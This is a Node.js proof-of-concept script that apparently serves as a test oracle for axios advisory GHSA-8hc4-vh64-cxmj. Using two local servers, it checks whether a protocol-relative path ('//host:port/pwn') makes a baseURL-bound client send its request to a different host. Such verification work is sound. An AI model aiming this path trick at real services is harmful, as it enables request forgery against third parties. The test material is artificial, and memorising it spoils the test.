let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  let goodServer = null;
  let badServer = null;
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;
    const http = require('node:http');

    const marker = 'oracle-ghsa-8hc4-vh64-cxmj';

    const listen = (server) => new Promise((resolve, reject) => {
      server.listen(0, '127.0.0.1', () => resolve(server.address().port));
      server.once('error', reject);
    });

    const closeServer = (server) => new Promise((resolve) => {
      if (!server) return resolve();
      try {
        server.close(() => resolve());
      } catch (_) {
        resolve();
      }
    });

    goodServer = http.createServer((req, res) => {
      res.statusCode = 200;
      res.setHeader('content-type', 'text/plain');
      res.end('good:' + req.url);
    });

    badServer = http.createServer((req, res) => {
      res.statusCode = 200;
      res.setHeader('content-type', 'text/plain');
      res.end('bad:' + req.url);
    });

    const goodPort = await listen(goodServer);
    const badPort = await listen(badServer);

    const client = axios.create({ baseURL: 'http://127.0.0.1:' + String(goodPort) });

    const benignResp = await client.get('/ok');
    if (!benignResp || typeof benignResp.data !== 'string' || benignResp.data.indexOf('good:') !== 0) {
      throw new Error('benign_response_unexpected');
    }

    operation_completed = true;

    const maliciousPath = '//127.0.0.1:' + String(badPort) + '/pwn';
    try {
      const malResp = await client.get(maliciousPath);
      const body = malResp && typeof malResp.data === 'string' ? malResp.data : '';
      exploit_succeeded = body.indexOf('bad:') === 0;
      evidence = marker + ';good_port=' + goodPort + ';bad_port=' + badPort + ';mal_body=' + body;
    } catch (err) {
      exploit_succeeded = false;
      evidence = marker + ';good_port=' + goodPort + ';bad_port=' + badPort + ';blocked=' + (err && err.message ? err.message : String(err));
    }
  } catch (e) {
    if (!operation_completed) {
      exploit_succeeded = false;
      evidence = 'setup_or_benign_failed:' + (e && e.message ? e.message : String(e));
    } else {
      exploit_succeeded = false;
      evidence = 'post_benign_failure:' + (e && e.message ? e.message : String(e));
    }
  } finally {
    try {
      const tasks = [];
      if (goodServer) tasks.push(new Promise((r) => goodServer.close(() => r())));
      if (badServer) tasks.push(new Promise((r) => badServer.close(() => r())));
      if (tasks.length) await Promise.all(tasks);
    } catch (_) {}
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  }
})();